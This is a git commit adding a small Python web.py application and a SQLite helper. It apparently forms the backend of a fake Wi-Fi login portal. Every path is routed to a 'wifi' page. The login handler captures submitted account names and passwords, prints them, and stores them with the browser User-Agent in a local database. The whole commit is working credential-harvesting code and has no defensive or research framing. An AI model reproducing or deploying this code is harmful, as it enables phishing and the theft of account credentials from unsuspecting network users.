5ea8bc287a067da508acadbae9101f071a69e962
pureboy <hlpureboy@163.com>
2019-02-28 20:26:30 +0800

    第一次提交

---
+++ SQL.py
@@ -0,0 +1,10 @@
+# encoding=utf-8
+import sqlite3
+def insertinfo(user,pwd,headers):
+    sql='insert into phone (userid,pwd,headers) VALUES (?,?,?)'
+    conn=sqlite3.connect("wifi.db")
+    cursor=conn.cursor()
+    cursor.execute(sql,(user,pwd,headers))
+    conn.commit()
+    cursor.close()
+    #conn.close()
---
+++ Web.py
@@ -0,0 +1,36 @@
+# encoding=utf-8
+import web
+import SQL
+urls=('/Control(.*)','login',
+      '/logout(.*)','logout',
+      '/notice','notice',
+      '/userinfo','userinfo',
+      '/(.*)','index'
+      )
+temp=web.template.render('temp')
+app=web.application(urls,globals())
+class notice:
+    def GET(self):
+        return temp.notice()
+class index:
+    def GET(self,name):
+        return temp.wifi()
+    def POST(self,name):
+        return temp.wifi()
+class login:
+    def GET(self,u):
+        username=web.input().get('username')
+        return temp.logout(username)
+    def POST(self,u):
+        headers=web.ctx.env.get('HTTP_USER_AGENT')
+        userdata=web.input()
+        name=userdata.get('strAccount')
+        pwd=userdata.get('strPassword')
+        print(u'账号:%s\t|密码:%s'%(name,pwd))
+        SQL.insertinfo(name,pwd,headers)
+        return temp.logout(name)
+class userinfo:
+    def GET(self):
+        return temp.userinfo()
+if __name__ == '__main__':
+    app.run()
